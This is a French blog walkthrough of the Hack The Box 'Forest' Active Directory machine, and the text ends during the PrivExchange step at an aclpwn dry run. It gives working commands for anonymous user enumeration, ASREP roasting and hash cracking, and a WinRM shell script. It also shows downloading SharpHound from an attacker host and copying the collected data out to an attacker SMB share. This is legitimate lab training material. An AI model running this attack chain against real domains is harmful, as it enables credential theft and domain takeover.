<!DOCTYPE html>
<html lang="">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.80.0" />

    
    
    

<title>Hack The Box - Forest • Haax - Personal Blog</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box - Forest"/>
<meta name="twitter:description" content="Forest est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un compte de service. Ce dernier, vulnérable à une attaque ASREP Roasting donne un accès utilisateur au travers de WinRM. L&rsquo;escalade de privilège est réalisée au travers de l&rsquo;exploitation de la vulnérabilité &ldquo;PrivExchange&rdquo;."/>

<meta property="og:title" content="Hack The Box - Forest" />
<meta property="og:description" content="Forest est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un compte de service. Ce dernier, vulnérable à une attaque ASREP Roasting donne un accès utilisateur au travers de WinRM. L&rsquo;escalade de privilège est réalisée au travers de l&rsquo;exploitation de la vulnérabilité &ldquo;PrivExchange&rdquo;." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://haax9.github.io/fr/walkthroughs/hackthebox/forest/" />
<meta property="article:published_time" content="2020-03-21T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-03-21T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    

</head>


    <body >
        
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      
      
          <a href="https://haax9.github.io">
          
          
          
          <div class="author-image">
            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
        
      <p class="site__description">
        <a href="https://haax9.github.io">
         Infosec articles &amp; CTF Writeups 
      </a>
      </p>
    </div>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/fr/articles/">
						<span>Articles</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/fr/walkthroughs/">
						<span>Walkthroughs</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/fr/writeups/">
						<span>Write-Ups</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/fr/about/">
						<span>À Propos</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/fr/conferences/">
						<span>Conférences</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="https://cheatsheet.haax.fr">
						<span>Cheatsheet</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/Haax9_" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
  
	
	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
	
	
	
	&nbsp;<a href="https://haax.fr/fr/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
	</section>

    </p>
    <div class="langSection">
      
      
      <a rel="alternate" href="/en/walkthroughs/hackthebox/forest/" hreflang="en" lang="en" class="langLink">English</a>
      <a rel="alternate" href="/en/walkthroughs/hackthebox/forest/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
      </div>
    <p class="copyright">
      &copy; 2023 Haax.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
  <div>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Hack The Box - Forest</h1>
    
    
<div class="post__meta">
    
    
      <i class="fas fa-calendar-alt"></i> Mar 21, 2020
    
    
    
    
    <br/>
    <i class="fas fa-clock"></i> 9 min read
</div>


  </header>
  <div class="post">
    <p>Forest est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un compte de service. Ce dernier, vulnérable à une attaque ASREP Roasting donne un accès utilisateur au travers de WinRM. L&rsquo;escalade de privilège est réalisée au travers de l&rsquo;exploitation de la vulnérabilité &ldquo;PrivExchange&rdquo;.</p>
<p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
<h2 id="découverte--énumération">Découverte / Énumération</h2>
<p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.161

Nmap scan report <span style="color:#66d9ef">for</span> htb.local <span style="color:#f92672">(</span>10.10.10.161<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">7867</span> closed ports, <span style="color:#ae81ff">2123</span> filtered ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2019-11-10 15:14:42Z<span style="color:#f92672">)</span>
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp  open  microsoft-ds Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 - <span style="color:#ae81ff">2012</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: HTB<span style="color:#f92672">)</span>
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>11/10%Time<span style="color:#f92672">=</span>5DC827BA%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNS
SF:VersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
</span><span style="color:#e6db74">SF:\x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2016</span> build <span style="color:#ae81ff">10586</span> - <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1507</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1507</span> - <span style="color:#ae81ff">1607</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Vista SP1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Network Distance: <span style="color:#ae81ff">2</span> hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div><p>Le domaine est ainsi repéré et les différents services semblent indiquer que l&rsquo;on se trouve face à un contrôleur de domaine Active Directory.</p>
<p>Il est possible d&rsquo;interroger l&rsquo;AD en tant qu&rsquo;utilisateur anonyme, ce qui permet notamment de récupérer la liste des utilisateurs du domaine (entre autres). Deux informations sont globalement importantes :</p>
<ul>
<li>La présence de l&rsquo;utilisateur <strong>svc-alfresco</strong>, typique d&rsquo;un compte de service ;</li>
<li>La présence de <strong>boites e-mails</strong>, importantes pour la suite.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> -N 10.10.10.161 
Unable to initialize messaging context

rpcclient $&gt; enumdomusers
user:<span style="color:#f92672">[</span>Administrator<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f4<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>DefaultAccount<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f7<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>$331000-VK4ADACQNUCA<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x463<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_2c8eef0a09b545acb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x464<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_ca8c2ed5bdab4dc9b<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x465<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_75a538d3025e4db9a<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x466<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_681f53d4942840e18<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x467<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_1b41c9286325456bb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x468<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_9b69f1b9d2cc45549<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x469<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_7c96b981967141ebb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46a<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_c75ee099d0a64c91b<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46b<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_1ffab36a2f5f479cb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46c<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxc3d7722<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46e<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxfc9daad<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46f<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxc0a90c9<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x470<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox670628e<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x471<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox968e74d<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x472<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox6ded678<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x473<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox83d6781<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x474<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxfd87238<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x475<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxb01ac64<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x476<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox7108a4e<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x477<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox0659cc1<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x478<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>sebastien<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x479<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>lucinda<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47a<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>svc-alfresco<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47b<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>andy<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47e<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>mark<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47f<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>santi<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x480<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>bob<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1db2<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>bob2<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1db3<span style="color:#f92672">]</span>
</code></pre></div><p><strong>Note importante :</strong> Afin d&rsquo;éviter les problèmes de résolution DNS, ne pas oublier de renseigner les informations de la machine dans les fichiers <code>resolv.conf</code> et <code>hosts</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 kalinux

10.10.10.161 htb.local
10.10.10.161 forest.htb.local
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/resolv.conf 
search htb.local
nameserver 10.10.10.161
</code></pre></div><h2 id="asrep-roasting-et-cassage">ASREP Roasting et cassage</h2>
<p>Il existe plusieurs attaques sur les comptes de services, la plus connue étant probalement le SPNRoasting (ou Kerberoasting). Cependant il est souvent nécessaire d&rsquo;avoir au préalable le contrôle d&rsquo;un premier compte utilisateur. Dans notre cas, il est possible d&rsquo;effectuer une attaque ASREP Roasting.</p>
<p>Cette dernière se base sur la propriété &ldquo;Do not require Kerberos preauthentication&rdquo; d&rsquo;un compte et permet de récupérer un ticket au format KRB5ASREP qu&rsquo;il sera nécessaire de casser afin d&rsquo;utiliser le compte.</p>
<p>Le script <code>GetNPUsers.py</code> de la suite Impacket est utilisé pour exploiter cette vulnérabilité sur le compte de service <strong>svc-alfresco</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
Impacket v0.9.21-dev - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7ae561334cd58a56af90f7fbb20bbd4493b6754a57d5ebc08cb7f47ea472ebb7c9ba4260f57c11b664be03191550254e5c77a17518aeabc55f9321bd9f52201df820e130aa0e3f4b0986725fd3a14794433881050eb62d384c4058a407a348a7de2ef0767a99c9df4f85d8eba8ce30a4ad59621c51f8ea8c0d33f33e06bea1d8ff28d7a86fc2010fd7fa45d2fcc2178cb13c1006823aec8a5da10cffcceeb6e978754b0d4976df5cccb4beb9776d5a8f4810153ccc0e1237ec74e6ae61402457c6cfe29bca7c2f62b287f13aff063f5a0a21c728581e43b46d7537b3e776b4
</code></pre></div><p>Le hash est ensuite cassé à l&rsquo;aide de <code>john</code> et de la wordlist classique &ldquo;rockyou.txt&rdquo;. Pour une raison que j&rsquo;ignore, hashcat n&rsquo;a pas réussi à casser ce hash avec la même wordlist&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ john ASREP_HASH --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>krb5asrep --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> 
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>krb5asrep, Kerberos <span style="color:#ae81ff">5</span> AS-REP etype 17/18/23 <span style="color:#f92672">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x<span style="color:#f92672">])</span>
Node numbers 1-4 of <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>fork<span style="color:#f92672">)</span>
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
s3rvice          <span style="color:#f92672">(</span>$krb5asrep$23$svc-alfresco@HTB.LOCAL<span style="color:#f92672">)</span>
<span style="color:#ae81ff">4</span> 1g 0:00:00:18 DONE <span style="color:#f92672">(</span>2019-11-10 16:32<span style="color:#f92672">)</span> 0.05285g/s 53986p/s 53986c/s 53986C/s s3urkf2m..s3rvice
</code></pre></div><h2 id="accès-via-winrm">Accès via WinRM</h2>
<p>Un compte du domaine est maintenant en notre possession.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:FOREST<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:HTB<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
SMB         10.10.10.161    <span style="color:#ae81ff">445</span>    FOREST           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> HTB<span style="color:#ae81ff">\s</span>vc-alfresco:s3rvice
</code></pre></div><p>Cependant, ce compte n&rsquo;est pas administrateur et les possibilités d&rsquo;exécution de commande à distance sont limitées.
C&rsquo;est là qu&rsquo;intervient WinRM (Windows Remote Management). Il s&rsquo;agit d&rsquo;un service/protocole Microsoft HTTP, basé sur WS-Management (SOAP) qui permet l&rsquo;administration à distance de machines sous Windows.
De retour à notre scan nmap, le port <strong>5985</strong>, utilisé par défaut par WinRM, est ouvert.</p>
<p>Plusieurs façon d&rsquo;exploiter. J&rsquo;ai choisi d&rsquo;utiliser le script Ruby suivant.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">$</span> cat winrm_shell<span style="color:#f92672">.</span>rb 
require <span style="color:#e6db74">&#39;winrm&#39;</span>

conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">WinRM</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Connection</span><span style="color:#f92672">.</span>new( 
  <span style="color:#e6db74">endpoint</span>: <span style="color:#e6db74">&#39;http://10.10.10.161:5985/wsman&#39;</span>,
  <span style="color:#e6db74">user</span>: <span style="color:#e6db74">&#39;HTB.LOCAL\svc-alfresco&#39;</span>,
  <span style="color:#e6db74">password</span>: <span style="color:#e6db74">&#39;s3rvice&#39;</span>,
)

command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>

conn<span style="color:#f92672">.</span>shell(<span style="color:#e6db74">:powershell</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>shell<span style="color:#f92672">|</span>
    <span style="color:#66d9ef">until</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">do</span>
        print <span style="color:#e6db74">&#34;PS &gt; &#34;</span>
        command <span style="color:#f92672">=</span> gets        
        output <span style="color:#f92672">=</span> shell<span style="color:#f92672">.</span>run(command) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>stdout, stderr<span style="color:#f92672">|</span>
            <span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>print stdout
            <span style="color:#66d9ef">STDERR</span><span style="color:#f92672">.</span>print stderr
        <span style="color:#66d9ef">end</span>
    <span style="color:#66d9ef">end</span>    
    puts <span style="color:#e6db74">&#34;Exiting with code </span><span style="color:#e6db74">#{</span>output<span style="color:#f92672">.</span>exitcode<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>Ce qui donne un accès à la machine ainsi que le premier flag !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell.rb
PS &gt; whoami
htb<span style="color:#ae81ff">\s</span>vc-alfresco

PS &gt; pwd
Path                           
----                           
C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-alfresco<span style="color:#ae81ff">\D</span>ocuments

PS &gt; type ../Desktop/user.txt
e5e4e47ae7022664cda6eb013fb0d9ed
</code></pre></div><h2 id="énumération-via-bloodhound">Énumération via BloodHound</h2>
<p>Ayant un accès utilisateur, une seconde phase d&rsquo;énumération commence. L&rsquo;outil <code>BloodHound</code> est absolument génial lorsqu&rsquo;il s&rsquo;agit de faire de la reconnaissance sur un environnement Active Directory. De plus, un portage en Python a été effectué afin de pouvoir collecter les informations à distance (<a href="https://github.com/fox-it/BloodHound.py)">https://github.com/fox-it/BloodHound.py)</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python bloodhound.py -u svc-alfresco -p s3rvice -d htb.local -c All
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found <span style="color:#ae81ff">1</span> domains
INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
INFO: Found <span style="color:#ae81ff">2</span> computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found <span style="color:#ae81ff">31</span> users
INFO: Found <span style="color:#ae81ff">72</span> groups
INFO: Found <span style="color:#ae81ff">0</span> trusts
INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
INFO: Querying computer: FOREST.htb.local
INFO: Querying computer: EXCH01.htb.local
INFO: Done in 00M 30S
</code></pre></div><p><strong>NOTE :</strong> Pour une raison que j&rsquo;ignore également (altération de la machine ?), j&rsquo;avais réalisé la collecte d&rsquo;infos d&rsquo;une autre façon une première fois, mais les résultats étaient différents, ce qui m&rsquo;a bloqué dans l&rsquo;escalade de privilèges.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Mise en place d&#39;un serveur HTTP local afin de déposer le collecteur powershell sur la machine</span>
python -m SimpleHTTPServer
Invoke-WebRequest -Uri “http://10.10.16.112:8000/SharpHound.ps1” -OutFile “.<span style="color:#ae81ff">\S</span>harpHound.ps1”

<span style="color:#75715e"># Collecte des informations en local via le shell WinRM</span>
Powershell.exe -Exec Bypass
Import-Module .<span style="color:#ae81ff">\S</span>harphound.ps1
Invoke-Bloodhound
Invoke-BloodHound -CollectionMethod All

<span style="color:#75715e"># Mise en place d&#39;un serveur SMB sur le réseau afin de récupérer les résultats</span>
sudo python smbserver.py testlol /home/xxxx/tmp
sudo python smbserver.py -smb2support testlol /home/xxxx/tmp

<span style="color:#75715e"># Récupération des résultats</span>
net view <span style="color:#ae81ff">\\</span>10.10.16.112<span style="color:#ae81ff">\T</span>ESTLOL
copy C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-alfresco<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\2</span>0191104044628_BloodHound.zip <span style="color:#ae81ff">\\</span>10.10.16.112<span style="color:#ae81ff">\T</span>ESTLOL<span style="color:#ae81ff">\f</span>ile.zip
</code></pre></div><p>Il est par la suite possible de visualiser les données via BloodHound.</p>
<h2 id="escalade-de-privilège---privexchange">Escalade de privilège - PrivExchange</h2>
<p>La visualisation des informations de l&rsquo;AD au travers de BloodHound permet d&rsquo;identifier un chemin potentiel de compromission partant de l&rsquo;utilisateur <code>svc-alfresco</code> et passant par les services de messagerie <strong>Exchange</strong>.</p>
<p>Un peu de recherche (ou de veille) mettent sur la piste de la vulnérabilité <strong>PrivExchange</strong> (<a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</a>) permettant ainsi à un utilisateur lambda de récupérer des droits <strong>DCSync</strong>, autorisant par conséquent des actions privlégiées sur le domaine.</p>
<p>L&rsquo;outil <code>aclpwn</code> développé également par l&rsquo;auteur de l&rsquo;exploit automatise la recherche de chemin de compromission dans un ensemble de données BloodHound et réalise l&rsquo;exploitation. Il est nécessaire pour cela d&rsquo;avoir une instance de BloodHound en marche étant donné que l&rsquo;outil se sert des graphes créés.</p>
<p>L&rsquo;option <code>-dry</code> permet dans un premier temps de simuler les actions effectuées sans réellement toucher à l&rsquo;AD.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python aclpwn.py -f svc-alfresco@htb.local -ft user -d htb.local -u svc-alfresco -p s3rvice -sp s3rvice -du neo4j -dp xxxx -dry
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Path found!
